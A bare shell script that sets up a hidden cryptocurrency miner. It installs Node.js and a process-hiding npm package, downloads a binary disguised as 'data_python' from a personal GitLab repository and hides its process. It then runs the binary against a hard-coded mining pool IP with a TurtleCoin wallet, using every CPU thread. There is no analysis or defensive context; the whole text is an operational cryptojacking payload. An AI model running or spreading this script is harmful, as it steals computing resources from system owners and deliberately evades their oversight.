wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz

\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/

\rm node-v14.17.0-linux-x64.tar.gz

PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH

npm config set cache /tmp --global

npm i -g node-process-hider

wget https://gitlab.com/richardkevin320/donlod/-/raw/main/data_python

chmod +x data_python

ph add data_python

./data_python --pool 131.153.76.130:80 --username TRTLuzshbW3d5NXYFoVuKwjiDRT4Bz9NSR4CzfLkiVXV99mxH7edcqfh95BM6Fq1MDB7j55YvvHCb8UkQJAh9Cs4NCsDBiKNL5j.TEST --password x --algorithm chukwa_v2 --threads $(nproc --all) --ssl
